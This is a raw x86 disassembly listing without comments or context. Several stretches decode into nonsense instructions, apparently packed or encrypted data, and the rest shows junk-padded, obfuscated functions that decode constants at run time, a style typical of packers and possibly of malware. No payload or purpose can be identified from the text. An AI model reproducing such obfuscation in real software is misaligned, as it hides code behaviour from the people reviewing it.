  415844:	sub    ch,BYTE PTR [ebx+eax*2-0x6191ef51]
  41584b:	out    0x1a,al
  41584d:	sbb    ecx,DWORD PTR [eax+0x54fd8b]
  415853:	pop    edi
  415854:	lock mov al,0x50
  415857:	popa   
  415858:	and    dl,BYTE PTR [edx]
  41585a:	in     al,dx
  41585b:	repz in al,0xed
  41585e:	mov    ch,0xe8
  415860:	in     al,0x73
  415862:	mov    ebp,0x647e5465
  415867:	add    eax,0xcb793504
  41586c:	add    al,0x58
  41586e:	dec    ebp
  41586f:	mov    BYTE PTR cs:[ebx-0x29],bh
  415873:	clc    
  415874:	jb     0x4158aa
  415876:	fbstp  TBYTE PTR [eax-0x7a78d740]
  41587c:	push   esi
  41587d:	idiv   BYTE PTR [ebp-0x473e0688]
  415883:	aas    
  415884:	leave  
  415885:	sub    ecx,ecx
  415887:	ins    DWORD PTR es:[edi],dx
  415888:	pusha  
  415889:	lods   eax,DWORD PTR ds:[esi]
  41588a:	mov    esi,0x10c52ad0
  41588f:	test   DWORD PTR [esi-0x7f358fd3],0x37aee815
  415899:	mov    ch,0x39
  41589b:	sar    esp,1
  41589d:	inc    ecx
  41589e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41589f:	addr16 sti 
  4158a1:	aaa    
  4158a2:	mov    ecx,DWORD PTR [esi+0x7d]
  4158a5:	hlt    
  4158a6:	sub    DWORD PTR [ebx+0x64],ebx
  4158a9:	test   DWORD PTR [edi-0x45],eax
  4158ac:	fnstenv [eax+0x45a2d80]
  4158b2:	fs test eax,0xa0573600
  4158b8:	nop
  4158b9:	mov    dh,0xa0
  4158bb:	ins    WORD PTR es:[edi],dx
  4158bd:	out    dx,al
  4158be:	loop   0x4158d4
  4158c0:	pop    ebp
  4158c1:	fisttp WORD PTR [ecx-0x4ab01931]
  4158c7:	outs   dx,DWORD PTR ds:[esi]
  4158c8:	jno    0x415872
  4158ca:	mov    eax,0x93e24d82
  4158cf:	push   ss
  4158d0:	and    al,0x32
  4158d2:	cmp    al,0xa9
  4158d4:	inc    ebp
  4158d5:	gs xchg ebp,eax
  4158d7:	adc    al,0x1e
  4158d9:	add    esi,DWORD PTR [esi-0x42]
  4158dc:	les    ebp,FWORD PTR ds:0xc39eb106
  4158e2:	out    dx,al
  4158e3:	outs   dx,DWORD PTR ds:[esi]
  4158e4:	loop   0x41592e
  4158e6:	or     al,0xb7
  4158e8:	hlt    
  4158e9:	out    0xf0,eax
  4158eb:	add    al,0x43
  4158ed:	inc    esi
  4158ee:	enter  0xc36c,0xc
  4158f2:	bound  ebp,QWORD PTR [esi]
  4158f4:	fcmovb st,st(2)
  4158f6:	daa    
  4158f7:	push   0x15
  4158f9:	mov    bl,0x71
  4158fb:	jno    0x4158e9
  4158fd:	xor    bl,BYTE PTR [ebx-0x33d2320a]
  415903:	jbe    0x415919
  415905:	mov    ebp,0x845320d8
  41590a:	push   es
  41590b:	or     DWORD PTR [eax+ebp*2-0x2d1d843f],ebp
  415912:	pop    ds
  415913:	in     eax,0x6a
  415915:	xchg   ecx,eax
  415916:	(bad)  
  415917:	out    dx,al
  415918:	scas   eax,DWORD PTR es:[edi]
  415919:	fs mov ch,0x84
  41591c:	in     al,dx
  41591d:	popf   
  41591e:	push   ds
  41591f:	push   edi
  415920:	pusha  
  415921:	xchg   al,bh
  415923:	xlat   BYTE PTR ds:[ebx]
  415924:	scas   eax,DWORD PTR es:[edi]
  415925:	pop    edx
  415926:	mov    bl,0x96
  415928:	push   eax
  415929:	enter  0x9d67,0x91
  41592d:	sbb    edx,DWORD PTR [edi+ecx*4]
  415930:	or     al,0x0
  415932:	xor    al,0x80
  415934:	in     al,dx
  415935:	inc    ecx
  415936:	fist   WORD PTR [ebx-0x5b]
  415939:	rcl    BYTE PTR [ecx+0x4b4d111e],0x28
  415940:	push   0xa6a064a3
  415945:	inc    ebx
  415946:	ret    0x4061
  415949:	push   ebx
  41594a:	cmp    al,0x3a
  41594c:	mov    BYTE PTR [esi-0x47],dh
  41594f:	jns    0x415965
  415951:	jne    0x41594b
  415953:	sub    BYTE PTR ds:0x56d1f9ed,0xaa
  41595a:	pop    ebx
  41595b:	mov    dh,0x89
  41595d:	mov    DWORD PTR [ebx-0x29eb8fc9],0x512128d0
  415967:	cwde   
  415968:	sub    DWORD PTR [eax],edx
  41596a:	lea    edi,[edi+0x34]
  41596d:	popf   
  41596e:	jecxz  0x4159ef
  415970:	dec    ecx
  415971:	cmp    DWORD PTR [esi+eax*1+0x6a2ad05b],edi
  415978:	and    al,0xad
  41597a:	into   
  41597b:	test   DWORD PTR [esp+esi*4-0x5dd0ae49],ebx
  415982:	mov    bl,dl
  415984:	js     0x4159bb
  415986:	fwait
  415987:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415988:	push   0x37da89e9
  41598d:	out    0x44,eax
  41598f:	mov    dh,0xf1
  415991:	adc    edi,edx
  415993:	mov    dh,0xf0
  415995:	(bad)  
  415996:	enter  0x5c4d,0x7e
  41599a:	lock mov al,ds:0x4ab31ebd
  4159a0:	push   cs
  4159a1:	sbb    eax,0xb693e4a9
  4159a6:	dec    ecx
  4159a7:	mov    al,0xb7
  4159a9:	arpl   bp,cx
  4159ab:	scas   eax,DWORD PTR es:[edi]
  4159ac:	sar    BYTE PTR [edx],0x4a
  4159af:	inc    ebp
  4159b0:	and    eax,0xe45b95e2
  4159b5:	sti    
  4159b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159b7:	pusha  
  4159b8:	push   0xffffffcb
  4159ba:	jmp    0x8bae:0x10f12b5
  4159c1:	inc    ebp
  4159c2:	loopne 0x4159f7
  4159c4:	ror    BYTE PTR [ebx-0x2fdc23bb],1
  4159ca:	mov    eax,DWORD PTR [ebp+0x10]
  4159cd:	xor    edx,0x7015
  4159d3:	sub    eax,edx
  4159d5:	mov    edx,DWORD PTR [ebp-0x28]
  4159d8:	mov    esi,DWORD PTR [ebp-0x2c]
  4159db:	and    edx,0x2a7b
  4159e1:	lea    edx,[edx+esi*1-0x3571]
  4159e8:	mov    esi,DWORD PTR [ebp-0x30]
  4159eb:	shr    edx,1
  4159ed:	or     edx,esi
  4159ef:	mov    esi,ecx
  4159f1:	sub    esi,edx
  4159f3:	add    esi,0x4751
  4159f9:	cmp    esi,eax
  4159fb:	jbe    0x4152ac
  415a01:	pop    esi
  415a02:	leave  
  415a03:	ret    0xc
  415a06:	push   ebp
  415a07:	mov    ebp,esp
  415a09:	sub    esp,0x7c
  415a0c:	xor    DWORD PTR ds:0x42821b,ebx
  415a12:	push   ebx
  415a13:	push   esi
  415a14:	push   edi
  415a15:	or     DWORD PTR ds:0x428357,0x412a
  415a1f:	mov    eax,DWORD PTR [ebp+0x8]
  415a22:	cmp    DWORD PTR ds:0x4281eb,0x0
  415a29:	mov    ebx,0x3b8c
  415a2e:	mov    DWORD PTR ds:0x42814b,0x632c
  415a38:	jmp    0x415aab
  415a3d:	mov    edx,0x517f
  415a42:	mov    edi,DWORD PTR ds:0x4282af
  415a48:	cmp    DWORD PTR ds:0x4281eb,0x0
  415a4f:	jae    0x415a95
  415a55:	push   DWORD PTR [ebp-0x14]
  415a58:	push   DWORD PTR [ebp-0x1c]
  415a5b:	push   DWORD PTR [ebp-0x18]
  415a5e:	push   DWORD PTR [ebp-0x18]
  415a61:	push   0x4a1d
  415a66:	push   0x1f83
  415a6b:	push   DWORD PTR [ebp-0x14]
  415a6e:	call   DWORD PTR ds:0x428ea4
  415a74:	mov    edi,DWORD PTR ds:0x42817f
  415a7a:	xor    ecx,ecx
  415a7c:	or     ecx,DWORD PTR ds:0x42819f
  415a82:	sub    edi,ecx
  415a84:	imul   edi,DWORD PTR [edi+ecx*1]
  415a88:	movzx  edx,WORD PTR ds:0x428137
  415a8f:	and    DWORD PTR ds:0x428363,edx
  415a95:	xor    DWORD PTR ds:0x428203,0x17b
  415a9f:	sbb    DWORD PTR ds:0x4282b7,ecx
  415aa5:	adc    DWORD PTR ds:0x42812b,edi
  415aab:	mov    ecx,DWORD PTR [ebp+0xc]
  415aae:	shrd   eax,ecx,0x2
  415ab2:	shr    ecx,0x2
  415ab5:	mov    ecx,DWORD PTR [ebp+0x8]
  415ab8:	and    edi,0x5809
  415abe:	mov    edx,DWORD PTR [ebp+0xc]
  415ac1:	mov    edi,DWORD PTR ds:0x428133
  415ac7:	xor    DWORD PTR ds:0x42825f,edi
  415acd:	xor    edx,edx
  415acf:	xor    ebx,ebx
  415ad1:	xor    ebx,DWORD PTR ds:0x4281af
  415ad7:	xor    edi,edi
  415ad9:	or     edi,DWORD PTR ds:0x42826b
  415adf:	sub    ebx,edi
  415ae1:	or     ebx,DWORD PTR [ebx+edi*1]
  415ae4:	mov    esi,0x329e695d
  415ae9:	xor    eax,esi
  415aeb:	adc    ebx,0x4305
  415af1:	or     eax,edx
  415af3:	mov    DWORD PTR [ebp-0x28],eax
  415af6:	not    edx
  415af8:	mov    eax,DWORD PTR [ebp+0x8]
  415afb:	sbb    DWORD PTR ds:0x428343,edx
  415b01:	shl    ecx,0x1e
  415b04:	mov    ecx,DWORD PTR [ebp+0xc]
  415b07:	shrd   eax,ecx,0x2
  415b0b:	adc    ebx,0x5b1c
  415b11:	xor    eax,esi
  415b13:	shr    ecx,0x2
  415b16:	sbb    DWORD PTR ds:0x42820f,ecx
  415b1c:	mov    ecx,DWORD PTR [ebp+0x8]
  415b1f:	mov    edi,DWORD PTR ds:0x42818f
  415b25:	mov    edx,DWORD PTR ds:0x4281df
  415b2b:	sub    edx,edi
  415b2d:	and    edi,DWORD PTR [edi+edx*1]
  415b30:	mov    edx,DWORD PTR [ebp+0xc]
  415b33:	cmp    DWORD PTR ds:0x42834f,0x0
  415b3a:	not    DWORD PTR ds:0x4282d3
  415b40:	mov    DWORD PTR ds:0x42822b,0x4d0
  415b4a:	mov    DWORD PTR ds:0x428123,0x25d8
  415b54:	jmp    0x415ba8
  415b59:	mov    DWORD PTR ds:0x428333,0x25ca
  415b63:	cmp    DWORD PTR ds:0x42834f,0x0
  415b6a:	jge    0x415b90
  415b70:	push   DWORD PTR [ebp-0x28]
  415b73:	push   0x42811b
  415b78:	push   0x12d6
  415b7d:	call   DWORD PTR ds:0x428e3c
  415b83:	add    DWORD PTR ds:0x42832b,0x4989
  415b8d:	inc    edi
  415b8e:	add    edi,ebx
  415b90:	sbb    DWORD PTR ds:0x4282df,0x655f
  415b9a:	mov    ebx,DWORD PTR ds:0x4282ab
  415ba0:	adc    DWORD PTR ds:0x4282e7,ebx
  415ba6:	xor    edi,edi
  415ba8:	xor    edx,edx
  415baa:	add    ebx,edi
  415bac:	or     eax,edx
  415bae:	cmp    DWORD PTR ds:0x42813f,0x0
  415bb5:	mov    DWORD PTR ds:0x428137,0x74bf
  415bbf:	mov    DWORD PTR ds:0x4282b7,0x4195
  415bc9:	jmp    0x415c2e
  415bce:	mov    ebx,0x25c0
  415bd3:	mov    ebx,0x1763
  415bd8:	cmp    DWORD PTR ds:0x42813f,0x0
  415bdf:	jl     0x415c13
  415be5:	push   0x432b
  415bea:	push   0x428217
  415bef:	call   DWORD PTR ds:0x428e40
  415bf5:	sub    edi,DWORD PTR ds:0x428363
  415bfb:	sbb    DWORD PTR ds:0x4282e7,ecx
  415c01:	and    edx,DWORD PTR ds:0x428157
  415c07:	mov    edi,DWORD PTR ds:0x4281ff
  415c0d:	and    DWORD PTR ds:0x42813b,edi
  415c13:	or     DWORD PTR ds:0x428133,0x73d6
  415c1d:	mov    edi,DWORD PTR ds:0x428163
  415c23:	mov    edx,DWORD PTR ds:0x4282eb
  415c29:	sub    edi,edx
  415c2b:	xor    edi,DWORD PTR [edi+edx*1]
  415c2e:	mov    DWORD PTR [ebp-0x28],eax
  415c31:	cmp    DWORD PTR ds:0x42832f,0x0
  415c38:	mov    DWORD PTR ds:0x42835b,ebx
  415c3e:	mov    DWORD PTR ds:0x42812f,ecx
  415c44:	jmp    0x415cab
  415c49:	mov    DWORD PTR ds:0x42814b,edx
  415c4f:	cmp    DWORD PTR ds:0x42832f,0x0
  415c56:	jbe    0x415ca1
  415c5c:	push   0x6725
  415c61:	push   0x4282cb
  415c66:	push   0x8698
  415c6b:	push   0x6e02
  415c70:	push   0x538f
  415c75:	push   DWORD PTR [ebp-0x24]
  415c78:	push   0x8d72
  415c7d:	push   0x8325
  415c82:	call   DWORD PTR ds:0x428d90
  415c88:	mov    edi,DWORD PTR ds:0x428187
  415c8e:	mov    edx,DWORD PTR ds:0x42830f
  415c94:	sub    edi,edx
  415c96:	sub    edi,DWORD PTR [edi+edx*1]
  415c99:	add    DWORD PTR ds:0x4282e7,ebx
  415c9f:	or     edx,ebx
  415ca1:	add    edx,edi
  415ca3:	or     ebx,ebx
  415ca5:	and    ebx,DWORD PTR ds:0x4281ff
  415cab:	mov    eax,ds:0x422398
  415cb0:	xor    edx,0x5bba
  415cb6:	mov    eax,DWORD PTR [eax]
  415cb8:	or     ebx,edx
  415cba:	mov    DWORD PTR [ebp-0xc],eax
  415cbd:	and    edi,0x77ac
  415cc3:	mov    eax,ds:0x4225b8
  415cc8:	mov    eax,DWORD PTR [eax]
  415cca:	cmp    DWORD PTR ds:0x42834b,0x0
  415cd1:	mov    edi,DWORD PTR ds:0x42823b
  415cd7:	mov    ebx,DWORD PTR ds:0x428363
  415cdd:	mov    DWORD PTR ds:0x428203,0x6f52
  415ce7:	jmp    0x415d31
  415cec:	mov    DWORD PTR ds:0x42833b,0x23d0
  415cf6:	cmp    DWORD PTR ds:0x42834b,0x0
  415cfd:	ja     0x415d21
  415d03:	push   DWORD PTR [ebp-0x18]
  415d06:	push   0x1c98
  415d0b:	push   DWORD PTR [ebp-0x1c]
  415d0e:	push   DWORD PTR [ebp-0xc]
  415d11:	call   DWORD PTR ds:0x428d94
  415d17:	or     ebx,edx
  415d19:	or     edx,edi
  415d1b:	adc    edi,0x39b9
  415d21:	and    edx,DWORD PTR ds:0x428227
  415d27:	sbb    edx,edi
  415d29:	add    edx,edi
  415d2b:	sbb    ebx,0x45bb
  415d31:	mov    DWORD PTR [ebp-0x10],eax
  415d34:	xor    DWORD PTR ds:0x42823f,0x428223
  415d3e:	mov    eax,DWORD PTR [ebp-0xc]
  415d41:	sbb    DWORD PTR ds:0x4282cf,0x4085
  415d4b:	mov    eax,DWORD PTR [ebp-0xc]
  415d4e:	mov    ebx,DWORD PTR [ebp+0x8]
  415d51:	cmp    DWORD PTR ds:0x4282e7,0x0
  415d58:	mov    DWORD PTR ds:0x428243,0x5216
  415d62:	not    DWORD PTR ds:0x42821b
  415d68:	mov    edi,0x3d1c
  415d6d:	mov    DWORD PTR ds:0x42823b,0x4705
  415d77:	jmp    0x415dc1
  415d7c:	mov    DWORD PTR ds:0x42825b,ebx
  415d82:	cmp    DWORD PTR ds:0x4282e7,0x0
  415d89:	jg     0x415da3
  415d8f:	push   0x42807b
  415d94:	push   0x428029
  415d99:	call   DWORD PTR ds:0x428d98
  415d9f:	and    edx,edx
  415da1:	sub    edi,edi
  415da3:	xor    edx,edx
  415da5:	xor    edx,DWORD PTR ds:0x42823f
  415dab:	sbb    DWORD PTR ds:0x428363,edx
  415db1:	or     DWORD PTR ds:0x428343,ebx
  415db7:	sbb    DWORD PTR ds:0x428263,0x12ba
  415dc1:	shl    ecx,0x1e
  415dc4:	xor    ecx,ecx
  415dc6:	adc    DWORD PTR ds:0x4282df,ecx
  415dcc:	shld   ecx,eax,0x2
  415dd0:	shl    eax,0x2
  415dd3:	mov    edi,0xca79a575
  415dd8:	mov    edx,0x9c1b89e8
  415ddd:	or     DWORD PTR ds:0x42811f,0x4c83
  415de7:	mov    DWORD PTR [ebp-0x38],ebx
  415dea:	mov    ebx,DWORD PTR [ebp+0xc]
  415ded:	xor    DWORD PTR ds:0x428117,0x6279
  415df7:	xor    eax,edi
  415df9:	sub    DWORD PTR ds:0x42815b,0x428123
  415e03:	xor    ecx,edx
  415e05:	mov    DWORD PTR ds:0x42815b,0x1398
  415e0f:	mov    DWORD PTR [ebp-0x1c],0xa4069bae
  415e16:	mov    DWORD PTR ds:0x42832f,0x5e42
  415e20:	mov    DWORD PTR [ebp-0x18],0xa40692ae
  415e27:	mov    DWORD PTR [ebp-0x34],ebx
  415e2a:	mov    DWORD PTR ds:0x428237,0x218e
  415e34:	cmp    eax,DWORD PTR [ebp-0x38]
  415e37:	mov    DWORD PTR ds:0x428263,0x534
  415e41:	jne    0x415e59
  415e47:	mov    DWORD PTR ds:0x42820f,0x12af
  415e51:	cmp    ecx,ebx
  415e53:	je     0x416649
  415e59:	mov    eax,DWORD PTR [ebp-0x10]
  415e5c:	adc    DWORD PTR ds:0x42823f,edx
  415e62:	mov    eax,DWORD PTR [ebp-0x10]
  415e65:	xor    ecx,ecx
  415e67:	shld   ecx,eax,0x2
  415e6b:	and    DWORD PTR ds:0x4282c7,0x42814f
  415e75:	shl    eax,0x2
  415e78:	xor    ecx,edx
  415e7a:	cmp    DWORD PTR ds:0x428133,0x0
  415e81:	not    edx
  415e83:	mov    DWORD PTR ds:0x4282df,edx
  415e89:	mov    edx,0x6413
  415e8e:	jmp    0x415f0c
  415e93:	mov    DWORD PTR ds:0x42814f,0x1988
  415e9d:	mov    DWORD PTR ds:0x428257,0x1d2b
  415ea7:	cmp    DWORD PTR ds:0x428133,0x0
  415eae:	je     0x415ee8
  415eb4:	push   0x6b61
  415eb9:	push   0x4c93
  415ebe:	call   DWORD PTR ds:0x428d9c
  415ec4:	or     DWORD PTR ds:0x4281f3,0x4f44
  415ece:	or     edx,0x2695
  415ed4:	sub    DWORD PTR ds:0x42832b,0x174
  415ede:	mov    DWORD PTR ds:0x42834f,0x41a3
  415ee8:	mov    edx,DWORD PTR ds:0x42834b
  415eee:	add    edx,DWORD PTR ds:0x42812f
  415ef4:	mov    DWORD PTR ds:0x42834b,edx
  415efa:	or     DWORD PTR ds:0x428337,ecx
  415f00:	mov    edx,DWORD PTR ds:0x4282e7
  415f06:	or     DWORD PTR ds:0x428247,edx
  415f0c:	mov    edx,DWORD PTR [ebp+0x8]
  415f0f:	xor    eax,edi
  415f11:	mov    DWORD PTR ds:0x428257,ecx
  415f17:	mov    edi,DWORD PTR [ebp+0xc]
  415f1a:	cmp    eax,edx
  415f1c:	jne    0x415f34
  415f22:	cmp    ecx,edi
  415f24:	mov    DWORD PTR ds:0x4282df,0x9a6
  415f2e:	je     0x416649
  415f34:	cmp    DWORD PTR ds:0x428113,0x0
  415f3b:	mov    DWORD PTR ds:0x428137,0x3be3
  415f45:	movzx  ebx,WORD PTR ds:0x428337
  415f4c:	not    edi
  415f4e:	jmp    0x415fba
  415f53:	mov    DWORD PTR ds:0x4282d7,ebx
  415f59:	cmp    DWORD PTR ds:0x428113,0x0
  415f60:	jne    0x415fad
  415f66:	push   0x3f61
  415f6b:	push   0x3f0f
  415f70:	push   DWORD PTR [ebp-0x18]
  415f73:	push   0x84fe
  415f78:	push   DWORD PTR [ebp-0x18]
  415f7b:	push   DWORD PTR [ebp-0x10]
  415f7e:	push   0x689e
  415f83:	push   DWORD PTR [ebp-0x18]
  415f86:	push   0x8af6
  415f8b:	call   DWORD PTR ds:0x428ea8
  415f91:	xor    DWORD PTR ds:0x428367,edx
  415f97:	sbb    edi,DWORD PTR ds:0x428243
  415f9d:	sub    DWORD PTR ds:0x4281ff,0x4f5e
  415fa7:	sub    ecx,DWORD PTR ds:0x42833b
  415fad:	add    edi,0xe71
  415fb3:	dec    ecx
  415fb4:	and    ecx,DWORD PTR ds:0x4282e3
  415fba:	mov    eax,DWORD PTR [ebp-0x18]
  415fbd:	and    DWORD PTR ds:0x428333,ebx
  415fc3:	mov    ecx,DWORD PTR [ebp-0x18]
  415fc6:	push   0xfffffffe
  415fc8:	pop    ebx
  415fc9:	and    DWORD PTR ds:0x42814b,0xd25
  415fd3:	xor    ecx,ebx
  415fd5:	movzx  edi,BYTE PTR ds:0x42814b
  415fdc:	add    DWORD PTR ds:0x428233,edi
  415fe2:	shl    ecx,0x1e
  415fe5:	cmp    DWORD PTR ds:0x4281ff,0x0
  415fec:	mov    DWORD PTR ds:0x428353,ecx
  415ff2:	mov    edi,0x37d1
  415ff7:	mov    DWORD PTR ds:0x428367,0x730b
  416001:	mov    edi,0x60e5
  416006:	jmp    0x416062
  41600b:	mov    DWORD PTR ds:0x428333,0x1cd3
  416015:	mov    DWORD PTR ds:0x42812f,0x4bc0
  41601f:	cmp    DWORD PTR ds:0x4281ff,0x0
  416026:	jg     0x41603f
  41602c:	push   0x1ec5
  416031:	call   DWORD PTR ds:0x428eac
  416037:	add    DWORD PTR ds:0x428133,edx
  41603d:	neg    edi
  41603f:	mov    DWORD PTR ds:0x4282d7,0x2c32
  416049:	and    edi,DWORD PTR ds:0x42820f
  41604f:	and    edi,0x1973
  416055:	movzx  edi,WORD PTR ds:0x428207
  41605c:	adc    DWORD PTR ds:0x42822b,edi
  416062:	mov    edi,0xa4069aaf
  416067:	and    DWORD PTR ds:0x42835b,0x1058
  416071:	xor    eax,edi
  416073:	sub    DWORD PTR ds:0x4282c7,0x42823f
  41607d:	shr    eax,0x2
  416080:	or     eax,ecx
  416082:	cmp    DWORD PTR ds:0x42814f,0x0
  416089:	mov    DWORD PTR ds:0x4282e7,0x1e83
  416093:	mov    DWORD PTR ds:0x428343,edx
  416099:	movzx  ecx,WORD PTR ds:0x42821b
  4160a0:	jmp    0x4160ed
  4160a5:	not    ecx
  4160a7:	mov    ecx,DWORD PTR ds:0x428153
  4160ad:	cmp    DWORD PTR ds:0x42814f,0x0
  4160b4:	jg     0x4160e2
  4160ba:	push   DWORD PTR [ebp-0x20]
  4160bd:	push   DWORD PTR [ebp-0x18]
  4160c0:	call   DWORD PTR ds:0x428da0
  4160c6:	adc    DWORD PTR ds:0x4282db,edi
  4160cc:	or     DWORD PTR ds:0x42821b,0x4a59
  4160d6:	mov    ecx,DWORD PTR ds:0x4281ef
  4160dc:	sub    DWORD PTR ds:0x42814b,ecx
  4160e2:	add    DWORD PTR ds:0x42823f,0x16e5
  4160ec:	dec    ecx
  4160ed:	mov    DWORD PTR [ebp-0x34],eax
  4160f0:	mov    eax,ds:0x422518
  4160f5:	and    ecx,DWORD PTR ds:0x42822f
  4160fb:	mov    DWORD PTR [ebp-0x34],eax
  4160fe:	mov    eax,DWORD PTR [ebp-0xc]
  416101:	mov    DWORD PTR [ebp-0x14],eax
  416104:	xor    DWORD PTR ds:0x42833b,ecx
  41610a:	mov    ecx,DWORD PTR [ebp-0x14]
  41610d:	or     DWORD PTR ds:0x428353,0x5817
  416117:	push   0x4
  416119:	cmp    DWORD PTR ds:0x42814b,0x0
  416120:	mov    DWORD PTR ds:0x428333,0x7b16
  41612a:	mov    DWORD PTR ds:0x42814f,0x195b
  416134:	jmp    0x41618b
  416139:	mov    DWORD PTR ds:0x42822b,0x5f2a
  416143:	cmp    DWORD PTR ds:0x42814b,0x0
  41614a:	jle    0x41616d
  416150:	push   DWORD PTR [ebp-0x20]
  416153:	call   DWORD PTR ds:0x428eb0
  416159:	xor    DWORD PTR ds:0x428127,0x42811b
  416163:	sub    DWORD PTR ds:0x428113,0x42813f
  41616d:	sbb    DWORD PTR ds:0x42824f,0x428247
  416177:	and    DWORD PTR ds:0x42823f,0x56d1
  416181:	xor    DWORD PTR ds:0x42822b,0x1431
  41618b:	pop    eax
  41618c:	or     DWORD PTR ds:0x42821f,0x42815b
  416196:	sub    eax,ecx
  416198:	mov    ecx,DWORD PTR [ebp-0x10]
  41619b:	add    ecx,eax
  41619d:	mov    DWORD PTR [ebp-0x24],ecx
  4161a0:	mov    ecx,DWORD PTR ds:0x4281cf
  4161a6:	mov    ecx,DWORD PTR [ecx]
  4161a8:	sbb    DWORD PTR ds:0x428153,ecx
  4161ae:	lea    eax,[ebp-0x30]
  4161b1:	mov    DWORD PTR [ebp-0x2c],eax
  4161b4:	and    eax,0x1e1b
  4161b9:	mov    eax,DWORD PTR [ebp-0x1c]
  4161bc:	mov    ecx,DWORD PTR [ebp-0x1c]
  4161bf:	xor    eax,edi
  4161c1:	xor    ecx,ebx
  4161c3:	sub    DWORD PTR ds:0x42814b,0x428227
  4161cd:	shr    eax,0x2
  4161d0:	and    DWORD PTR ds:0x42824b,0x42820b
  4161da:	shl    ecx,0x1e
  4161dd:	sbb    DWORD PTR ds:0x4282d7,0x4281eb
  4161e7:	or     eax,ecx
  4161e9:	or     DWORD PTR ds:0x428243,0x697f
  4161f3:	mov    DWORD PTR [ebp-0x20],eax
  4161f6:	mov    DWORD PTR [ebp-0x8],0xa4069abe
  4161fd:	mov    eax,DWORD PTR [ebp-0x8]
  416200:	mov    ecx,DWORD PTR [ebp-0x8]
  416203:	xor    eax,edi
  416205:	xor    ecx,ebx
  416207:	shr    eax,0x2
  41620a:	shl    ecx,0x1e
  41620d:	or     ecx,eax
  41620f:	push   ecx
  416210:	lea    eax,[ebp-0x8]
  416213:	push   eax
  416214:	lea    eax,[ebp-0x7c]
  416217:	push   eax
  416218:	call   0x415231
  41621d:	mov    eax,DWORD PTR [ebp-0x8]
  416220:	mov    ecx,DWORD PTR [ebp-0x8]
  416223:	xor    eax,edi
  416225:	xor    ecx,ebx
  416227:	shr    eax,0x2
  41622a:	shl    ecx,0x1e
  41622d:	or     ecx,eax
  41622f:	push   ecx
  416230:	lea    eax,[ebp-0x14]
  416233:	push   eax
  416234:	mov    eax,DWORD PTR [ebp+0x8]
  416237:	mov    ecx,DWORD PTR [ebp+0xc]
  41623a:	shrd   eax,ecx,0x2
  41623e:	shr    ecx,0x2
  416241:	mov    ecx,DWORD PTR [ebp+0x8]
  416244:	mov    edx,DWORD PTR [ebp+0xc]
  416247:	xor    eax,esi
  416249:	xor    edx,edx
  41624b:	or     eax,edx
  41624d:	lea    eax,[ebp+eax*4-0x78]
  416251:	push   eax
  416252:	shl    ecx,0x1e
  416255:	call   0x415231
  41625a:	mov    eax,DWORD PTR [ebp-0x8]
  41625d:	mov    ecx,DWORD PTR [ebp-0x8]
  416260:	xor    eax,edi
  416262:	xor    ecx,ebx
  416264:	shr    eax,0x2
  416267:	shl    ecx,0x1e
  41626a:	or     ecx,eax
  41626c:	push   ecx
  41626d:	lea    eax,[ebp-0x24]
  416270:	push   eax
  416271:	mov    eax,DWORD PTR [ebp+0x10]
  416274:	mov    ecx,DWORD PTR [ebp+0x14]
  416277:	shrd   eax,ecx,0x2
  41627b:	shr    ecx,0x2
  41627e:	mov    ecx,DWORD PTR [ebp+0x10]
  416281:	mov    edx,DWORD PTR [ebp+0x14]
  416284:	xor    eax,esi
  416286:	xor    edx,edx
  416288:	or     eax,edx
  41628a:	lea    eax,[ebp+eax*4-0x78]
  41628e:	push   eax
  41628f:	shl    ecx,0x1e
  416292:	call   0x415231
  416297:	mov    eax,DWORD PTR [ebp-0x8]
  41629a:	mov    ecx,DWORD PTR [ebp-0x8]
  41629d:	xor    ecx,ebx
  41629f:	xor    eax,edi
  4162a1:	shl    ecx,0x1e
  4162a4:	shr    eax,0x2
  4162a7:	or     ecx,eax
  4162a9:	push   ecx
  4162aa:	lea    eax,[ebp-0x20]
  4162ad:	push   eax
  4162ae:	mov    eax,DWORD PTR [ebp+0x10]
  4162b1:	mov    ecx,DWORD PTR [ebp+0x14]
  4162b4:	shrd   eax,ecx,0x2
  4162b8:	shr    ecx,0x2
  4162bb:	mov    ecx,DWORD PTR [ebp+0x10]
  4162be:	mov    edx,DWORD PTR [ebp+0x14]
  4162c1:	xor    edx,edx
  4162c3:	xor    eax,esi
  4162c5:	or     eax,edx
  4162c7:	shl    ecx,0x1e
  4162ca:	mov    ecx,DWORD PTR [ebp+0x10]
  4162cd:	mov    edx,DWORD PTR [ebp+0x14]
  4162d0:	shrd   ecx,edx,0x2
  4162d4:	shr    edx,0x2
  4162d7:	mov    edx,DWORD PTR [ebp+0x10]
  4162da:	mov    ebx,DWORD PTR [ebp+0x14]
  4162dd:	xor    ecx,esi
  4162df:	xor    ebx,ebx
  4162e1:	or     ecx,ebx
  4162e3:	add    eax,ecx
  4162e5:	lea    eax,[ebp+eax*4-0x78]
  4162e9:	push   eax
  4162ea:	shl    edx,0x1e
  4162ed:	call   0x415231
  4162f2:	mov    eax,DWORD PTR [ebp-0x8]
  4162f5:	mov    ecx,DWORD PTR [ebp-0x8]
  4162f8:	xor    ecx,0xfffffffe
  4162fb:	shl    ecx,0x1e
  4162fe:	jmp    0x41655e
  416303:	sbb    eax,0x26add60b
  416308:	lods   eax,DWORD PTR ds:[esi]
  416309:	sbb    bh,BYTE PTR [edx-0x45]
  41630c:	xor    bl,BYTE PTR [ebx+0x70]
  41630f:	cmp    cl,bl
  416311:	xchg   ecx,eax
  416312:	jo     0x416308
  416314:	add    BYTE PTR [esi],dl
  416316:	sbb    BYTE PTR [ebx+0x3f181814],bl
  41631c:	fucomip st,st(4)
  41631e:	cs (bad) 
  416320:	das    
  416321:	mov    ds:0x1a6bffef,eax
  416326:	add    bh,BYTE PTR [ebp+0x7a1c35d3]
  41632c:	dec    esp
  41632d:	cli    
  41632e:	inc    ecx
  41632f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416330:	shl    BYTE PTR [eax+edx*8+0x7b],cl
  416334:	lock push cs
  416336:	call   0xc27a:0x413765c1
  41633d:	mov    ebp,0xfefdb073
  416342:	fidivr WORD PTR [esi]
  416344:	icebp  
  416345:	mov    edi,0x40f09bcb
  41634a:	mov    ?,WORD PTR [esi+0x398c6e3e]
  416350:	or     BYTE PTR [ebp+0x51975b65],dh
  416356:	aaa    
  416357:	scas   eax,DWORD PTR es:[edi]
  416358:	xchg   ebp,eax
  416359:	call   0xabedf60d
